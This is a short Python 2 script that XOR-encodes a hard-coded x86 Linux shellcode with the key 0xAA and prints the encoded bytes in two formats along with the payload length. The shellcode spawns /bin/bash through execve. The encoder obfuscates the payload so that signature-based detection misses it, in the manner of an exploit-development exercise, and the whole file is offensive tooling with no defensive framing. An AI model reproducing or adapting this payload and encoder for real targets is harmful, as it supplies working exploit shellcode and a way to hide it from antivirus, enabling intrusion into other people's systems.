#!/usr/bin/python

# Python XOR Encoder 

shellcode = ("\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x58\x59\x59\x59\x59\x43\x43\x43\x43")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	# XOR Encoding 	
	y = x^0xAA
	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
